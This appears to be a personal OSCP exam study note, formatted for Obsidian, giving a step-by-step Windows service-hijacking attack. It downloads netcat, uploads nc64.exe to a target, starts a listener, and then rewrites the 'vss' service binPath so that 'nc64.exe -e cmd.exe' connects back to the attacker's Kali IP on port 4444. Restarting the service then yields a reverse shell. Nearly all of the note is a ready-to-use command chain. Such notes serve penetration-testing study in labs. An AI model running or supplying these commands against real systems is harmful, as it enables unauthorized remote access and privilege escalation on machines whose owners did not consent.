Find system architecture

**CMD**

```cmd
systeminfo | findstr /i "System Type
```

**PowerShell**

```powershell
$env:PROCESSOR_ARCHITECTURE
```

---

Grab the correct version of netcat on Kali Attacker

nc.exe
```
wget https://github.com/int0x33/nc.exe/blob/master/nc.exe
```

nc64.exe
```
wget https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe
```

---

Upload Netcat onto windows target

```
upload nc64.exe
```

---

Prepare a netcat listener on Kali Attacker to prepare to catch reverse shell

```
nc -lvnp 4444
```

---

Hijack and start sc.exe
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `sc.exe config vss binPath="C:\\\Users\\\svc-printer\\\Desktop\\nc64.exe -e cmd.exe ${KaliIP} 4444"`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
sc.exe stop vss
```

```
sc.exe start vss
```

---

Troubleshoot

```
sc.exe qc vss
```